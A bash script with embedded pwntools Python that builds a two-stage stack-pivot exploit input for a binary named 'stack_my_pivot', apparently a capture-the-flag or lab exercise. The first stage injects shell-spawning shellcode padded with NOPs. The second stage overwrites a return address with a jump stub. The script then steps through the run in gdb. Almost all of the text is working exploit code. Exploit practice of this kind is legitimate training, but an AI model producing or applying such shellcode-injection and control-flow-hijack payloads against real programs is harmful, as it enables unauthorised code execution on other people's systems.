#!/bin/bash

# Create input file
python3 << 'EOF'
from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
first_input = shellcode.ljust(50, b'\x90')

jump_stub = b'\xeb\xb6'
second_input = b'\x90' * 8
second_input += jump_stub
second_input += b'\x90' * (23 - len(second_input))
second_input += p32(0x40072e)
second_input += b'\x90'

with open('/tmp/exploit_input', 'wb') as f:
    f.write(first_input)
    f.write(b'\n')
    f.write(second_input)
    f.write(b'\n')

print(f"Input created, lengths: {len(first_input)}, {len(second_input)}")
EOF

# Run with gdb
gdb -batch \
  -ex 'set pagination off' \
  -ex 'break *0x40072e' \
  -ex 'break *0x400799' \
  -ex 'run < /tmp/exploit_input' \
  -ex 'info registers rip rsp rbp rsi' \
  -ex 'x/20gx $rsp' \
  -ex 'continue' \
  -ex 'info registers rip rsp rbp rsi' \
  -ex 'x/20gx $rsp' \
  -ex 'continue' \
  -ex 'info registers rip rsp rbp rsi' \
  ./stack_my_pivot
